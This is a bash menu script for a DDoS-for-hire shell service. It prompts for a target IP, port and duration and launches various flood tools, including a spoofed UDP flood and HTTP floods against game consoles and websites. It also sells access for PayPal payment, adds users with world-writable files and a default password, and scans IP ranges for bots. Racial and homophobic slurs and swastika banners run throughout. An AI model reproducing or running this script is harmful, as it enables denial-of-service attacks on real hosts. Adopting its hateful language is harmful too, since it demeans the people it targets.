#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              # No Color
# Trap Signal Script
#
exit_script()
{
  echo "* * *Trap * * *"
  perl menu


}


hulksmash()
{
    clear
	echo -e "${LIGHTGREEN}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
                                                
                                                
                                                
echo ""
echo -e -n "${GREEN}Enter websites URL: "
read Host
python hulk.py $Host
} 

udp_floodb()
{
    clear
    echo -e "${LIGHTRED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "                                             
echo ""
echo -e "[  ${RED}Exz ${LIGHTRED}]"
echo ""
echo -e -n "${RED}Enter Target Ip: "
read ip
echo -e -n "${RED}Enter Port: "
read port
echo -e -n "${RED}Enter Time: "
read time
perl esg.pl $ip $port 100 10000
}

nudemethod()
{
clear
echo -e "${LIGHTRED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e ""
echo -e -n "Enter ip :"
read ip
echo -e -n "Enter Port :"
read port
echo -e -n "Enter Time :"
read time
perl esg.pl $ip $port $time
}

evil()
{
    clear
    echo -e " ${RED} "
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
    echo ""
    echo "    FUCK THIS SHIT"
    echo ""
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter a the time :"
read time
echo "Enter the size Ex: 1"   
read size
perl system.pl $ip $port $size $time
}

A6()
{
    clear
    echo -e " ${WHITE} "
    echo "               Exz is proud to present"  
    echo ""                                                     
    echo -e "  _______   ________  __    __  ______   ______ "  
    echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
    echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
    echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
    echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
    echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
    echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
    echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
    echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "                                                              
    echo ""
    echo ""
echo -e "Enter target ip please ${YELLOW}Ex: 12.12.12.12${WHITE}"
read ip
echo -e "Enter a port number ${YELLOW}Ex: 0-Random 53-DNS 80-Home/Websites 3074-Xbox 3478-PS${WHITE}"
read port
echo -e "Enter the thread count ${YELLOW}Ex: 15${WHITE}"
read threads
echo -e "Enter the time in seconds ${YELLOW}Ex: 300 Seconds=5 Mins${WHITE}"
read time
./dominate $ip $port $threads -1 $time
}

pythonv1()
{
    clear
        echo -e " ${LIGHTRED} "
echo -e "Python With A Bite ;)"
    echo ""
echo -e -n "${RED}Enter Victims ip : "
read ip
echo -e -n "${CYAN}Enter Targets Port : "
read port
echo -e -n "${LIGHTRED}Enter Time : "
read time
python system.py $ip $port $time
}

stdmethod()
{
clear
echo -e "${LIGHTRED}"
echo -e ""
echo -e -n "${LIGHTRED}Enter Targets ip : "
read ip
echo -e -n "${YELLOW}Enter Targets Port : "
read port
echo -e -n "${WHITE}Enter Targets Seconds : "
read time
./std $ip $port $time
}

Unlimitedholder()
{
clear
echo -e "${LIGHTGREEN}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e ""
echo -e -n "${RED}Enter Targets ip : "
read ip
echo -e -n "${CYAN}Enter Targets Port : "
read port 
echo -e -n "${LIGHTRED}Enter Seconds (0 for unlimited) : "
read time
python unlimited.py $ip $port $time
}

xodiav2()
{
    clear
    echo -e "${WHITE}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e -n "${RED}Enter That FUCKING UGLY Targets Ip: "
read ip
echo -e -n "${RED}Enter FUCKING Port: "
read port
echo -e -n "${RED}Enter Zodiacs Time of Death: "
read time
echo -e -n "${LIGHTRED} Enter the size of his penis: 1"
read size
perl system.pl $ip $port $time $size
}

goldeneye()
{
clear 
echo -e "Goldeneye Web Drowner"
echo -e -n "${CYAN}Enter Http:// : "
read http
python 007.pl $http
}

http()
{
clear 
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e "X.D Exz Custom Python Http Website Drowner"
echo -e "(we piss on your mom)"
echo -e -n "${CYAN}Enter Website URL : "
read http
python 007.pl $http
}

deluser()
{
#!/bin/bash
clear
echo "+=================================+"
echo "+---------------------------------+"
echo " +           Remove User         + "
echo " +                               + "
echo " +-------------------------------+ "
echo " "
echo "Username: "
read uname
userdel $uname
rm -r /home/$uname
echo "User removed"
echo "press any key when done"
read
}

magic()
{
    clear
    echo -e "${LIGHTRED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo ""
echo -e "[  ${RED} Flood Attack  ${RED}]"
echo ""
echo -e -n "${RED}Enter Target Ip: "
read ip
echo -e -n "${RED}Enter Port: "
read port
echo -e -n "${RED}Enter Time: "
read time
perl magic.pl $ip $port $time
}

contact()
{
clear
echo -e "${LIGHTRED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e ""
echo -e "|Contact List Includes |YouTube,Facebook,Instagram,Twitter,Kik,Skype| "
echo -e ""
echo -e "${WHITE}Exz Owner/Server: kik:ExzServer IG@:exzowner FB:Exz Owner Skype:ExzServer YT@:Exz Owner"
echo -e ""
echo -e "${WHITE}NOW REMEMBER IF YOU NEED ANY HELP JUST CONTACT ANY OF ME!"
read
}

magicv2()
{
    clear
    echo -e "${LIGHTRED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo ""
echo -e "[  ${RED}Exz RIP"
echo ""
echo -e -n "${RED}Enter Target Ip: "
read ip
echo -e -n "${RED}Enter Port: "
read port
echo -e -n "${RED}Enter Time: "
read time
perl magic.pl $ip $port $time
}

geoip()
{
clear
echo -e "${RED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e ""          
echo -e "       Exz Owner's Custom Coded Geo IP" 
echo -e ""
echo -e "Enter IP "
read ip
perl IPtoLocation.pl $ip
read
}

pydos()
 {
 clear  
 echo -e "${RED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo ""
echo -e -n "${LIGHTRED}Enter Targets ip:"
read ip
echo -e -n "${RED}Enter Port:"
read port
echo -e -n "${LIGHTRED}Enter Time:"
read time
./pydos $ip $port $time 
}

adduser()
{
#!/bin/bash
clear
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo " "
echo "New Username: "
read uname
useradd $uname
mkdir /home/$uname
cp /home/gott/start /home/$uname/menu
passwd $uname 
cd /home/$uname
chmod 777 *
echo "User Added, Password set to GoTT"
echo "press any key when done"
read
}

whoson()
{
#!/bin/bash
clear
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
w
echo "press any key when done"
read
}

ping()
{
clear
echo -e "${LIGHTRED}"
echo -e "This outta be simple lol"
echo -e "|Enter That Ip Boi!|"
echo ""
echo -e -n "${RED}Enter Ping ip: "
read ip
./ping $ip
}

udp.pl()
{
clear
  echo -e "${RED}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo ""
echo -e "[  ${LIGHTRED}Exz Spoofed UDP Flood Attack  ${LIGHTRED}]"
echo ""
echo -e -n "${RED}Enter Target Ip: "
read ip
echo -e -n "${RED}Enter Port: "
read port
echo -e -n "${RED}Enter Throttle(USE -1): "
read throttle
echo -e -n "${RED}Enter Thread(USE 15): "
read thread
echo -e -n "${RED}Enter Time: "
read time 
./sudp $ip $port $throttle $thread $time
}

lockkill()
{
#!/bin/bash
clear
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo "Enter Username: "
read uname
passwd -l $uname
kill -9 ps -u $uname -o "pid="
echo "press any key when done"
read
}

attacktime()
{
echo -e "		     ${RED}Time Converter${WHITE}"
echo ""
echo -e "${WHITE}Here is a small time converter I made for you guys. You can go longer, I just   made this for a example."
echo ""
echo -e "${RED}Minutes=Seconds            Minutes=Seconds=Hours${WHITE}"
echo ""
echo -e "5  Minutes=300 Seconds     60 Minutes=3600 Seconds=1 Hour"
echo -e "10 Minutes=600 Seconds     90 Minutes=5400 Seconds=1 Hour And 30 Minutes"
echo -e "15 Minutes=900 Seconds     120 Minutes=7200 Seconds=2 Hours"
echo -e "20 Minutes=1200 Seconds    150 Minutes=9000 Seconds=2 Hours And 30 Minutes"  
echo -e "25 Minutes=1500 Seconds    180 Minutes=10800 Seconds=3 Hours " 
echo -e "30 Minutes=1800 Seconds    210 Minutes=12600 Seconds=3 Hours And 30 Minutes" 
echo -e "35 Minutes=2100 Seconds    240 Minutes=14400 Seconds=4 Hours" 
echo -e "40 Minutes=2400 Seconds    270 Minutes=16200 Seconds=4 Hours And 30 Minutes" 
echo -e "45 Minutes=2700 Seconds    300 Minutes=18000 Seconds=5 Hours" 
echo -e "50 Minutes=3000 Seconds    330 Minutes=19800 Seconds=5 Hours And 30 Minutes " 
echo -e "55 Minutes=3300 Seconds    360 Minutes=21600 Seconds=6 Hours " 
echo ""
echo -e "${RED}When finished reading press enter"
read done
}

botscanner()
{
clear
echo -e "${RED}"
echo -e ""
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e ""
echo -e -n "Enter ${WHITE} 182.64.0.0: "
read thread      
echo -e -n "Enter 182.79.255.255: "
read LUCKY
echo -e -n "Enter 0: "
read thread
python exz.py $thread $thread $thread
}                                                

tos()
{
clear
echo -e "${WHITE}"
echo -e "  _______   ________  __    __  ______   ______ "  
echo -e " |       \ |        \|  \  |  \|      \ /      \ "  
echo -e " | $$$$$$$\| $$$$$$$$| $$\ | $$ \$$$$$$|  $$$$$$\ "
echo -e " | $$__/ $$| $$__    | $$$\| $$  | $$  | $$___\$$ "
echo -e " | $$    $$| $$  \   | $$$$\ $$  | $$   \$$    \ "
echo -e " | $$$$$$$ | $$$$$   | $$\$$ $$  | $$   _\$$$$$$\ "
echo -e " | $$      | $$_____ | $$ \$$$$ _| $$_ |  \__| $$ "
echo -e " | $$      | $$     \| $$  \$$$|   $$ \ \$$    $$ "
echo -e "  \$$       \$$$$$$$$ \$$   \$$ \$$$$$$  \$$$$$$ "
echo -e "|TERMS OF SERVICES|"
echo -e ""
echo -e "|DOSING|"
echo -e "The only thing you can ddos is your fucking moms pussy"
echo -e ""
echo -e "|REFUNDS AND MONEY BACK|"
echo -e "Send all payments to gangin@mail.com on paypal!"
echo -e "If you do you get fucking ulimited access!"
echo -e ""
echo -e "|Sharing Accounts|"
echo -e "If you share an account, you get a fucking sticker"
echo -e "Banning is not allowed on my shit faggots"
echo -e "any admin/staff catches 2ips logged on the server your membership will be"
echo -e "automatically upgraded!"
echo -e ""
echo -e "|RULE|"
echo -e "Please Log into servers with Home connections No Proxies Allowed"
echo -e "(SO THAT IF YOU FUCK US OVER WE CAN HIT YOU OFF)"
echo -e "                   #FAGGOTS"
echo -e ""
read
}

exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
	   clear
echo -e "${RED}" 
echo -e "卍☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★卍"
echo -e "${WHITE}"
echo -e This Script is for niggerz and niggerz only!
echo -e ""
echo -e "${RED}"
echo -e "卍☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★☆☆★☆★☆★☆★☆★☆★☆★☆★☆★☆★★☆★☆★☆★☆★卍"

	echo -e ""
	echo -e "${WHITE}      |DDoS Methods|                       |Tools|"
	echo -e ""
	echo -e "${RED}[1]-FUCKME    [2]-FUCKME "
	echo -e "${RED}[3]-FUCKME           [4]-FUCKME "
	echo -e "${RED}[5]-FUCKME        [6]-FUCKME      [15]-Tos (For Niggerz) "
	echo -e "${RED}[7]-FUCKME    [8]-FUCKME "
	echo -e "${RED}[9]-FUCKME        [10]-FUCKME "
	echo -e "${RED}[11]-FUCKME        [12]-FUCKME " 
	echo -e "${RED}[13]-FUCKME         [14]-FUCKME " 
	echo -e ""
	echo -e -n "${LIGHTRED}Select Choice (1 - 15):${WHITE} " 
    read yourch
    case $yourch in 
      1) nudemethod ;;
	  2) magic ;;
	  3) hulksmash ;;
	  4) udp_floodb ;;    
	  5) magicv2 ;;
	  6) xodiav2 ;;
	  7) evil ;;
      8) pythonv1 ;;
      9) goldeneye;;
	 10) stdmethod ;;
     11) Unlimitedholder;;  
	 12) http ;;
	 13) pydos ;;
	 14) A6 ;;
	 15) tos ;;
	  end) pkill menu  ;;
      *) echo "~Xodia~...is gay" ;
         echo "You entered something wrong so basically your gay asf" ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1
